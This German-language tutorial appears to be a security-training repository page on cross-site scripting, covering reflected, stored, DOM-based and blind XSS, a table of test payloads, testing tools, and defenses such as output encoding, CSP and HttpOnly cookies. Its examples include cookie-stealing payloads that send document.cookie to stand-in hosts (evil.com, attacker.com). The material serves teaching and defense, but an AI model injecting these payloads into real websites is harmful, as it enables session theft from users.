# ⚠️ Cross-Site Scripting (XSS) – Überblick, Typen, Schutz

## Inhaltsverzeichnis

- [Einleitung](#einleitung)
- [Grundlagen & Ziel](#grundlagen--ziel)
    - [Der typische Angriffsfluss sieht so aus](#der-typische-angriffsfluss-sieht-so-aus)
- [Typen von XSS](#typen-von-xss)
    - [1. Reflected XSS (nicht persistent)](#1-reflected-xss-nicht-persistent)
    - [2. Stored XSS (persistent)](#2-stored-xss-persistent)
    - [3. DOM-based XSS](#3-dom-based-xss)
    - [4. Blind XSS (verborgen)](#4-blind-xss-verborgen)
- [Nützliche XSS Payloads](#nützliche-xss-payloads)
- [Praxis - Testen mit XSS](#praxis---testen-mit-xss)
    - [Tools](#tools)
    - [Testbare Labs](#testbare-labs)
- [Schutzmaßnahmen gegen XSS](#schutzmaßnahmen-gegen-xss)
    - [Server-seitiger Schutz](#server-seitiger-schutz)
    - [Client-seitiger Schutz](#client-seitiger-schutz)
- [Bonus: XSS in modernen Frameworks](#bonus-xss-in-modernen-frameworks)
- [Nützliche Links](#nützliche-links)
- [Haftungsausschluss](#haftungsausschluss)



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Einleitung

**Cross-Site Scripting (XSS)** ist eine Web-Sicherheitslücke, bei der Angreifer **schädlichen JavaScript-Code** in Webseiten einschleusen, der im Browser anderer Benutzer ausgeführt wird. Dies ermöglicht Angreifern, auf sensible Nutzerdaten wie Anmeldeinformationen zuzugreifen, Aktionen im Namen des Benutzers auszuführen oder die Webseite zu manipulieren.

💡 XSS zählt laut [OWASP Top 10](https://owasp.org/www-project-top-ten/) seit Jahren zu den **häufigsten Sicherheitslücken** in Webanwendungen.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Grundlagen & Ziel
XSS zählt zu den Client-seitigen Injection-Angriffen. Der Angreifer manipuliert eine Webanwendung, um seinen Code an einen anderen Benutzer zu senden. Das primäre Ziel ist es, den Browser des Opfers dazu zu bringen, den bösartigen Code auszuführen.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### Der typische Angriffsfluss sieht so aus:
```text
 Angreifer            Webanwendung         Opfer-Browser
     |                     |                    |
1. Schädliche  --->  (verarbeitet)   --->  (zeigt an)
   Eingabe                 |                    |
     |                     |                    |
     |        <---    (Code wird)    <---   (JavaScript)
     |        <---    (an Browser)        (wird ausgeführt)
     |        <---    (geschickt)               |
     |                     |                    |
2. Aktionen   <---   (Opfer-Daten)   <---  (gestohlene)
   ausführen               |                    |
     |                     |                    |

```

**Ziel von XSS:** Ausführen von JavaScript im Kontext des Opfers, z. B. um:

- Cookies zu stehlen (`document.cookie`)

- Session-Tokens zu exfiltrieren

- Inhalte zu verändern (`defacement`)

- Phishing-Popups anzuzeigen

- Keylogging durchzuführen

- Zugriff auf Browser-APIs (z. B. `localStorage`) zu erlangen




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Typen von XSS

### 1. **Reflected XSS** (nicht persistent)
Reflected XSS tritt auf, wenn die Eingabe eines Benutzers sofort und ohne ordnungsgemäße Verarbeitung in der Antwort des Servers wiedergegeben wird. Da der bösartige Code nicht auf dem Server gespeichert wird, muss der Angreifer das Opfer dazu verleiten, eine manipulierte URL zu besuchen.

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

#### typischer Ablauf eines Angriffs:
```text
+------------+       +------------+       +------------+
|  Angreifer |       | Webserver  |       |   Opfer    |
+------------+       +------------+       +------------+
      |                  |                      |
1. Schickt bösartige URL |                      |
      |----------------->|                      |
      |                  |                      |
2. Sendet HTML-Antwort   |                      |
      |                  |                      |
3. URL per Phishing-Mail |                      |
   / Link                |                      |
      |                  |                      |
      |---------------------------------------->|
      |                  |                      |
4. Code wird im Browser  |                      |
   des Opfers ausgeführt |                      |
      |<-----------------|                      |
      |                  |                      |
      |<----------------------------------------|
      |                  |                      |
5. Angreifer klaut 
   die Cookies

```
- **Typisch:** Formulare, URLs, Suchfelder.

- **Beispiel:**

```html
URL: [http://example.com/search?q=](http://example.com/search?q=)<script>alert('Reflected XSS')</script>
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### 2. Stored XSS (persistent)
Bei Stored XSS wird der bösartige Code dauerhaft auf dem Server gespeichert (z. B. in einer Datenbank oder einem Dateisystem). Jedes Mal, wenn ein Benutzer die betroffene Seite aufruft, wird der schädliche Code vom Server abgerufen und in seinem Browser ausgeführt.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

#### typischer Ablauf eines Angriffs
```text
+------------+       +-------------+       +--------------+
|  Angreifer |       | Webserver   |       |    Opfer     |
+------------+       +-------------+       +--------------+
      |                    |                       |
1. Schickt bösartigen Code |                       |
   (z.B. in Kommentar)     |                       |
      |------------------->|                       |
      |                    |                       |
2. Code wird in der DB     |                       |
   des Servers gespeichert |                       |
      |                    |---------------------->|
      |                    |                       |
3. Opfer besucht die Seite |                       |
      |                    |---------------------->|
      |                    |                       |
4. Code wird vom Server    |                       |
   an das Opfer gesendet   |                       |
      |                    |                       |
5. Code wird im Browser    |                       |
   ausgeführt, Angreifer   |                       |
   klaut Cookies           |                       |
      |<-------------------------------------------|
```
- **Typisch:** Kommentare, Foren, Profilfelder.

- **Beispiel:**
```html
<!-- Ein Benutzer speichert im Kommentar: -->
<script>fetch('[http://evil.com?cookie=](http://evil.com?cookie=)' + document.cookie)</script>
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### 3. DOM-based XSS
DOM-based XSS ist die gefährlichste Form, da der Angriff rein im Browser des Opfers stattfindet. Der Server ist nicht beteiligt, da die Schwachstelle im clientseitigen JavaScript-Code liegt. Der Angreifer manipuliert das **Document Object Model** (**DOM**), um den schädlichen Code auszuführen.

- **Typisch:** Client-seitige Formulare, die URL-Fragmente (`#`) oder andere Quellen nutzen, um Inhalte dynamisch in die Seite zu laden.

- **Beispiel:**
```javascript
// gefährlich:
document.body.innerHTML = location.hash;
// Beispiel-URL: http://site.com/#<img src=x onerror=alert(1)>
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### 4. Blind XSS (verborgen)

Blind XSS ist eine Variante des Stored XSS, bei der die Auswirkungen des Angriffs nicht sofort sichtbar sind. Der schädliche Code wird an einer Stelle eingeschleust, die nicht öffentlich sichtbar ist, sondern nur von einem Administrator oder einem internen Mitarbeiter der Anwendung angesehen wird (z. B. in einem Backend-Panel).

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

#### typischer Ablauf eines Angriffs:
```text
+------------+            +-------------+       +-------------------+
|  Angreifer |            | Webserver   |       | Administrator /   |
+------------+            +-------------+       | interner Nutzer   |
      |                       |                 +-------------------+
1. Schickt schädlichen        |                        |
   Code an nicht öffentliches |                        |
   Formular (z.B. Feedback)   |                        |
      |---------------------->|                        |
      |                       |                        |
2. Code wird in der DB        |                        |
   gespeichert                |                        |
      |                       |----------------------->|
      |                       |                        |
3. Admin ruft Backend auf     |                        |
      |                       |----------------------->|
      |                       |                        |
4. Der bösartige Code wird    |                        |
   auf dem Admin-Panel        |                        |
   angezeigt                  |                        |
      |                       |                        |
5. Angreifer klaut die        |                        |
   Admin-Session oder führt   |                        |
   Befehle aus                |                        |
      |<-----------------------------------------------|

```

- **Typisch:** Kontaktformulare, Support-Tickets, interne Notizfunktionen.

- **Erkennung:** Schwer zu finden, da man nicht weiß, ob der Code überhaupt ausgeführt wird. Tools wie XSS Hunter sind hier essenziell.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Nützliche XSS Payloads
Die Wahl des Payloads hängt stark vom Kontext der Anwendung ab.

| Zweck                   | Beispiel-Payload                                                   |
| ----------------------- | ------------------------------------------------------------------ |
| Einfacher Test          | `<script>alert(1)</script>`                                        |
| HTML-Injection          | `<img src=x onerror=alert(1)>`                                     |
| Inline SVG              | `<svg/onload=alert(1)>`                                            |
| Base64 Encoded          | `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoM...>`|
| Cookie stehlen          | `<script>fetch('http://attacker.com?c='+document.cookie)</script>` |
| DOM XSS                 | `#<img src=x onerror=alert(1)>`                                    |
| JavaScript-only (Event) | `<body onload=alert(1)>`                                           |

**Tipp:** Nutze Tools wie [XSS Cheat Sheet (PortSwigger)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), um Payloads an verschiedene Umgebungen anzupassen.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Praxis - Testen mit XSS

### Tools

| Tool                   | Beschreibung                               |
| ---------------------- | ------------------------------------------ |
| Burp Suite             | Proxy zum Einfügen & Abfangen von Payloads |
| OWASP ZAP              | Automatisierte Scans + manuelles Testen    |
| XSS Hunter             | Entdeckung & Überwachung von Blind XSS     |
| XSStrike               | Fuzzer mit intelligenter Erkennung         |
| Google Chrome DevTools | Testumgebung im Browser                    |

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### Testbare Labs

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [HackTheBox Academy: XSS Fundamentals](https://academy.hackthebox.com/)
- [TryHackMe: XSS Room](https://tryhackme.com/room/xss)




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Schutzmaßnahmen gegen XSS
Der Schutz vor XSS ist eine grundlegende Aufgabe der **Secure Development Lifecycle** (**SDLC**). Er muss auf mehreren Ebenen erfolgen, um einen soliden Abwehrmechanismus aufzubauen.

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### Server-seitiger Schutz

Der Server ist deine erste und wichtigste Verteidigungslinie.

- **Output-Encoding:** Dies ist die effektivste Methode. Alle Daten, die vom Server an den Browser gesendet werden, müssen korrekt kodiert werden, um ihren "Sinn" als Code zu verlieren.

    - **Beispiel:** Ein `<` wird zu `&lt;` und ein `>` wird zu `&gt;`. Der Browser interpretiert diese Zeichen dann nicht mehr als HTML-Tag, sondern als reinen Text.

- **Input-Validierung:** Prüfe alle Nutzereingaben, bevor sie verarbeitet oder gespeichert werden.

    - **Beispiel:** Erlaube in einem Namensfeld nur alphabetische Zeichen oder in einer Postleitzahl nur Zahlen.

- **Content Security Policy (CSP):** Sende spezielle HTTP-Header, die dem Browser vorschreiben, welche Quellen für Skripte, Styles und andere Ressourcen erlaubt sind.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

### Client-seitiger Schutz

- **Content Security Policy (CSP):** Dies ist der effektivste clientseitige Schutz. Der CSP-Header, der vom Server gesendet wird, weist den Browser an, welche Skripte, Stylesheets und andere Ressourcen aus welchen Quellen geladen werden dürfen. Inline-Skripte und Skripte von unbekannten Domains werden so blockiert.

    - **Beispiel für einen strikten CSP-Header:**

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; img-src 'self'; style-src 'self'
```

- **HTTPOnly-Flag bei Cookies:** Ein Cookie mit dem `HttpOnly`-Flag kann nicht über JavaScript (`document.cookie`) ausgelesen werden. Dies schützt Session-Cookies vor XSS-Angriffen, bei denen Angreifer sie stehlen wollen.

- **Mitarbeiterschulungen:** Entwickler und Wartungspersonal sollten für XSS-Risiken sensibilisiert und geschult werden.


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Bonus: XSS in modernen Frameworks
Moderne JavaScript-Frameworks wie React, Angular und Vue bieten integrierte Schutzmechanismen, die die meisten XSS-Angriffe verhindern.

- **Automatisches Escaping:** Frameworks wie React escapen standardmäßig alle Strings, die in das DOM eingefügt werden. Dadurch werden XSS-Attacken massiv erschwert.

    - Problematisch bleiben:
        - `dangerouslySetInnerHTML` (React)
        - `v-html` (Vue)
        - Manuelle Nutzung von Browser-APIs wie innerHTML, `document.write()`, `eval()` in deinem Code.

Diese Funktionen sollten nur dann verwendet werden, wenn du die Eingabedaten vorher streng validiert und saniert hast.




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Nützliche Links

- [OWASP XSS Overview](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Academy](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Cheat Sheet (OWASP)](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings: XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Wikipedia: XSS](https://de.wikipedia.org/wiki/Cross-Site-Scripting)




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** September 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---